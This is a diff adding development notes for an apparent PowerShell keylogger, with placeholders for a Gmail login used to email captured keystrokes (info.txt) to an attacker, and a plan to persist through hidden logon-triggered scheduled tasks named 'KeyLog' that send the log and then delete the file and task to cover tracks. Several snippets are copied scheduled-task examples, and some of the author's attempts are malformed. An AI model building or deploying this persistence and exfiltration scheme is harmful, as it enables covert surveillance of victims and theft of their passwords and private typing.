@@ -1,0 +1,77 @@
+Credit/Inspiration: https://www.andreafortuna.org/2019/05/22/how-a-keylogger-works-a-simple-powershell-example/
+
+YOURACCOUNTLOGIN: Your gmail account
+YOURACCOUNTPASSWORD: Your gmail password
+SENDTOACCOUNT: The email you want to send info.txt to
+
+Issue: Relies on target to press "CTRL + C"... Because to my understanding, it is impossible to execute a script or a function when the Command Prompt 
+ - X is pressed in the ribbon... or when the computer is shutdown / rebooted
+
+My solution: 
+1) On the termination issue: 
+ - https://blog.netwrix.com/2018/07/03/how-to-automate-powershell-scripts-with-task-scheduler/
+ - https://devblogs.microsoft.com/scripting/use-powershell-to-create-scheduled-tasks/
+ - https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2019-ps
+ - https://devblogs.microsoft.com/scripting/powertip-use-powershell-to-delete-scheduled-task/
+ - https://o365reports.com/2019/08/02/schedule-powershell-script-task-scheduler/
+ - Create a ScheduledTask inside of Powershell that runs a powershell script on startup... Effectively ignoring the issue with shutdown, and forces a script
+ - that runs on startup instead... Inside of the ScheduledTask script we can send the file to ourselves & delete the file & delete the scheduledtask after everything is sent...
+
+Example 1:
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
+  -Argument '-NoProfile -WindowStyle Hidden -command "& {get-eventlog -logname Application -After ((get-date).AddDays(-1)) | Export-Csv -Path c:\fso\applog.csv -Force -NoTypeInformation}"'
+$trigger =  New-ScheduledTaskTrigger -Daily -At 9am
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"
+
+Example 2:
+$A = New-ScheduledTaskAction -Execute "Taskmgr.exe"
+$T = New-ScheduledTaskTrigger -AtLogon
+$P = New-ScheduledTaskPrincipal "Contoso\Administrator"
+$S = New-ScheduledTaskSettingsSet
+$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
+Register-ScheduledTask T1 -InputObject $D
+
+Example 3:
+Unregister-ScheduledTask -TaskName "KeyLog" -Confirm:$false
+
+Example 4: # My Attempt... In administrator
+$P = "task_test.txt"
+$C = "This is the content for the Task_Test thing...."
+$I = '-NoProfile -WindowStyle Hidden -command "New-Item $P; Set-Content $P $C"'
+$A = New-ScheduledTaskAction -Execute "Powershell.exe" `
+    -Execute 'powershell.exe' `
+    -Argument '-File C:\scripts\Get-LatestAppLog.ps1'
+$T = New-ScheduledTaskTrigger -AtLogon
+$N = "KeyLog"
+$D = "A Powershell script that logs keystrokes"
+Register-ScheduledTask -Action $A -Trigger $T -TaskName $N -Description $D
+
+Get-ScheduledTask -TaskName "KeyLog"
+
+
+Example 4:
+$Time = New-ScheduledTaskTrigger -AtLogon
+$Action = New-ScheduledTaskAction -Execute PowerShell.exe -Argument "C:/Users/range/CodingProjects/Malduino/CMD/Keylogger/Test.ps1"
+Register-ScheduledTask -TaskName "KeyLog" -Trigger $Time -Action $Action
+
+
+Example 5:
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\range\CodingProjects\Malduino\CMD\Keylogger\Test.ps1'
+$trigger =  New-ScheduledTaskTrigger -Daily -At 10am
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Task_Test" -Description "testing powershell task creation"
+
+Example 6:
+$Execute = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$Argument = "Z:\Applications\002Diverse_Installationen\Powershell\Scripts_WIP\EnableActiveProbing.ps1"
+$At = "07:00"
+$Repeat = (New-TimeSpan -Minutes 60)
+$Task_Name = "Enable Active Probing "
+$Execution_Time_Limit = (New-TimeSpan -Minutes 5)
+$User = "NT-AUTORITÄT\SYSTEM"
+
+$Action = New-ScheduledTaskAction -Execute $Execute -Argument $Argument
+$Trigger = New-ScheduledTaskTrigger -Once -At $At -RepetitionInterval $Repeat 
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit $Execution_Time_Limit
+$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings 
+
+Register-ScheduledTask -TaskName $Task_Name -InputObject $Task -User $User
